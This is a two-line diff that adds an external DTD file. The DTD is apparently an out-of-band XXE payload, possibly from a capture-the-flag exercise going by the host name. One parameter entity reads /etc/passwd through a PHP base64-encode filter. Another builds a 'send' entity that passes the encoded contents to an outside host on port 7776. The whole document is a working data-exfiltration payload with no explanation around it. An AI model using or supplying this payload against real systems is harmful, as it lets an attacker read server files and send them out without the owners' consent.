@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://hk.ctfstu.com:7776/?p=%file;'>">
